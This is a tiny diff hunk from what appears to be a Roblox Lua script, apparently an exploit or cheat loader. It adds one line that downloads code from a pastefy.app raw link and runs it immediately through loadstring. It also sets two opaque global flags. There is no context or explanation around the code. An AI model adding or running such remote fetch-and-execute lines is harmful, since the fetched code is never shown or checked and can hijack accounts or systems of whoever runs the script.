@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastefy.app/0xBjOiy1/raw"))()
 _SHWXLoaded = true
 _Hawk = "ohhahtuhthttouttpwuttuaunbotwo"
 
